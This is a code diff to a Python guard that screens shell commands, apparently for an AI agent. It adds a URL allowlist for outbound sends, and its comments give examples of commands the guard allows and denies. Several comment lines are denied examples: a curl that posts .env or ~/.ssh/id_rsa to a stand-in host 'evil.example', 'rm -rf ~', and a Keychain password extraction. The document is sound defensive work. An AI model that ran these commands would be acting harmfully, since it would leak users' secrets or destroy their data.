@@ -30,7 +30,7 @@ SECRETS = (r'(\.env\b|\.ssh/|id_rsa|id_ed25519|id_ecdsa|\.pem\b|\.p12\b|\.netrc'
 
 # SECRET_FILES = 「秘密の“ファイル”を参照している」ことを示す指標（SECRETS の部分集合）。
 # token/password/secret/api_key 等の“語”は除外している点が重要:
-#   - `-H "X-ChatWorkToken: $CHATWORK_BOT_API_TOKEN"` のような認証ヘッダは SECRET_FILES に当たらない
+#   - `-H "Authorization: Bearer $API_TOKEN"` のような認証ヘッダは SECRET_FILES に当たらない
 #     （正規のAPI認証であり、サンクション済み送信先になら通してよい）。
 #   - 一方 `.ssh/id_rsa` `.env` `credentials` 等の“ファイル”は、宛先がサンクション済みでも
 #     送出させない（秘密ファイルの中身を外へ出す経路を塞ぐ）。
@@ -163,23 +163,23 @@ def check_rm(cmd, root):
 # そして allowlist が緩めるのは「秘密の外部送信(SENDERS+SECRETS)」ルール **だけ**。
 # 破壊的削除・push/deploy・Keychain 取り出し・WebFetch 等は従来どおり止まる。
 #
-# 例: NR_ALLOWED_SEND_URLS = ^https://api\.chatwork\.com/v2/rooms/[^/?#]+/messages$
+# 例: NR_ALLOWED_SEND_URLS = ^https://api\.example\.com/v1/notify$
 #
 #   通す (ALLOW):
-#     curl -X POST -H "X-ChatWorkToken: $CHATWORK_BOT_API_TOKEN" \
-#          -d "body=..." https://api.chatwork.com/v2/rooms/123/messages
+#     curl -X POST -H "Authorization: Bearer $API_TOKEN" \
+#          -d "body=..." https://api.example.com/v1/notify
 #       → 全URLが一致(条件1) かつ 秘密ファイル参照なし(条件2)。トークンは認証ヘッダ。
 #
 #   弾く (DENY、いずれも従来の秘密送信ルールに戻る/別ルールで停止):
-#     ・別宛先:   curl ... https://evil.example/collect              （条件1で不一致）
-#     ・2宛先混在: curl ...chatwork.../messages; curl ...evil...      （条件1で不一致）
-#     ・秘密送出: curl -d @.env ...chatwork.../messages              （条件2で .env 参照）
-#                curl -d "x=$(cat ~/.ssh/id_rsa)" ...chatwork.../messages（条件2で id_rsa）
+#     ・別宛先:   curl ... https://evil.example/collect                 （条件1で不一致）
+#     ・2宛先混在: curl ...api.example.com/v1/notify; curl ...evil...    （条件1で不一致）
+#     ・秘密送出: curl -d @.env ...api.example.com/v1/notify            （条件2で .env 参照）
+#                curl -d "x=$(cat ~/.ssh/id_rsa)" ...notify            （条件2で id_rsa）
 #     ・別ルール: git push / rm -rf ~ / security find-generic-password（allowlistは無関係に停止）
 #
 # 正規表現の堅さ: URL は fullmatch（全体一致）で判定するため、
-#   `.../messages/../../evil` のような「許可プレフィックス＋別パス」は弾かれる。
-#   [^/?#]+ で room セグメントを1階層に縛り、host も api\.chatwork\.com で固定。
+#   `.../notify/../../evil` のような「許可プレフィックス＋別パス」は弾かれる。
+#   [^/?#]+ 等でパスセグメントを縛り、host も固定すること。
 def _allowed_send_patterns():
     raw = os.environ.get("NR_ALLOWED_SEND_URLS", "") or ""
     pats = []
